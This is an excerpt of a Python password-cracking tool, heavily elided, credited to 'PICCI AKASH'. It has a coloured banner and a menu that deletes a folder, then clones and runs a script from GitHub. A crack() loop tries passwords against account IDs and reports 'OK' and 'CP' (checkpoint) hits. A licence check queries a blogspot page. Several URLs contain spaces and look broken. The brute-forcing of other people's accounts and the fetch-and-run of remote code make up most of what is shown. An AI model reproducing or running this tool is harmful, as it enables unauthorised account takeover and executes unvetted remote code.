...
\33[1;37m--------------------------------------------
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m DEVELOPER :   PICCI AKASH
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m TOOLS     :   FILE & RANDOM
 \033[1;31m[\033[1;32m•\033[1;31m]\033[1;32m GITHUB    :   PICCI AKASH-404
...
def menu():
	...
	if me in ["1", "01"]:
		...
		os.system('rm -rf Control-Room && git clone https://github.com/PICCI AKASH-404/Control-Room && cd Control-Room && python ran.py ')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [PICCI AKASH-XD] {h}{loop}|{len(id)} | OK:-{h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r \x1b[1;91m[🔒PICCI AKASH-CP] {idf} | {pw}')     
				...
				print(f'\r\r\x1b[38;5;46m[💉PICCI AKASH-OK] '+idf+ ' | '+pw+'')
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://PICCI AKASH404.blogspot.com/2023/05/approved.html').text
    if id in httpCaht:
